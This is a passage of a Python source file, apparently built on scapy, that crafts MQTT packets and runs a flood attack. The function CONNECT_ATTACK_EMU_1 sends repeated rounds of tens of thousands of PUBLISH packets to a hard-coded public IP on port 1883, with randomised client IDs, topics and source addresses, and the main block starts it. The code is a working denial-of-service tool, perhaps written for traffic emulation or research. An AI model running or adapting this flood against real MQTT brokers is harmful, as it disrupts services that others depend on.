            ss.sr1(packet)
            # time.sleep(0.1)
        else:
            ss.send(packet)

    # Stopping connection
    # print("END")
    logging.info(msg='SEND END')
    ss.close()


def GEN_RANDOM_PACKAGE_EQUAL(number: int = 1, clientId_suffix='MQTT_', topic_suffix='attack/', topicName='attack/#'):
    if number == 1:
        # return build_mqtt_connect_packet_only(randomIP.RANDOM_NAME(suffix='MQTT_'))
        # PLEASE CHECK HOW TO USE THE <CONNECT_ONLY_TEST_0(**KARGS)>
        CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix=clientId_suffix), willflag=1, willretainflag=1,
                            usernameflag=1,
                            passwordflag=1)
    elif number == 2:
        return CONEECTACK_ONLY_TEST_0()
    elif number == 3:
        return PUBLISH_ONLY_TEST_0(topic=randomIP.RANDOM_NAME(suffix=topic_suffix, randomLen=random.randint(1, 10)),
                                   value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20)))
    elif number == 4:
        return PUBACK_ONLY_TEST_0()
    elif number == 5:
        return PUBREC_ONLY_TEST_0()
    elif number == 6:
        return PUBREL_ONLY_TEST_0()
    elif number == 7:
        return PUBCOMP_ONLY_TEST_0()
    elif number == 8:
        return SUBSCRIBE_ONLY_TEST_0([f'{topicName}'])
    elif number == 9:
        return SUBACK_ONLY_TEST_0()
    elif number == 10:
        return UNSUBSCRIBE_ONLY_TEST_0([f'{topicName}'])
    elif number == 11:
        return UNSUBACK_ONLY_TEST_0()
    elif number == 12:
        return PINGREQ_ONLY_TEST_0()
    elif number == 13:
        return PINGRESP_ONLY_TEST_0()
    elif number == 14:
        return DISCONNECT_ONLY_TEST_1()
    elif number == 15:
        return AUTH_ONLY_TEST_0()
    else:
        raise Exception(ERR_MESSAGE.get(0))


def GEN_RANDOM_PACKAGE_PUBLISH_MAIN():
    mqtt_type = [3, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
    choose_type = random.choices(mqtt_type, [1, 1, 900, 1, 1, 1, 1, 87, 1, 1, 1, 1, 1, 1, 1])
    return choose_type[0]


def CONNECT_ATTACK_EMU_1():
    """
    good
    :return:
    """

    def random_attack():
        send_scenarii(
            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix='MQTT_'), willflag=1, willretainflag=1,
                                 usernameflag=1, passwordflag=1)] +

            [
                GEN_RANDOM_PACKAGE_EQUAL(
                    number=GEN_RANDOM_PACKAGE_PUBLISH_MAIN(),
                    clientId_suffix='MQTT_',
                    topic_suffix='test/',
                    topicName='test/#'
                ) for _ in range(10000)
            ],
            temp_target_ip)

    def flood_attack():
        send_scenarii(
            [CONNECT_ONLY_TEST_0(clientId=randomIP.RANDOM_NAME(suffix='MQTT_'), willflag=1, willretainflag=1)] +
            [
                PUBLISH_ONLY_TEST_0(
                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
                    value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                )
            ] * 5000
            +
            [
                PUBLISH_ONLY_TEST_0(
                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
                    value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                )
            ] * 5000
            +
            [
                PUBLISH_ONLY_TEST_0(
                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
                    value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                )
            ] * 5000
            +
            [
                PUBLISH_ONLY_TEST_0(
                    topic=randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10)),
                    value=randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))
                )
            ] * 5000
            ,
            temp_target_ip)

    round = 0
    while True:
        round += 1
        logging.info(
            msg=f'ATTACK ROUND {round} START!'
        )
        temp_client_id = randomIP.RANDOM_NAME(suffix='MQTT_')
        temp_target_ip = '148.70.99.98'
        temp_target_port = 1883
        temp_src_ip = randomIP.IPV4()
        temp_src_port = random.randint(12000, 16665)
        topic = randomIP.RANDOM_NAME(suffix='test/', randomLen=random.randint(1, 10))
        value = randomIP.RANDOM_NAME(randomLen=random.randint(10, 20))

        try:
            flood_attack()

        except ConnectionAbortedError as cae:
            print(f'Error = <{cae}>')

        except ConnectionResetError as cre:
            print(f'Error = <{cre}>')

        logging.info(
            msg=f'ATTACK ROUND {round} END!'
        )
        # time.sleep(1)
        # break
        # time.sleep(0.1)
        if round >= 1e5:
            break


if __name__ == '__main__':
    # CONNECT_TEST_0()
    # PUBLISH_TEST_0(destination=destination, topic=topic)
    # SOCKET_TEST_0()
    # CONNECT_ATTACK_EMU_0()
    CONNECT_ATTACK_EMU_1()
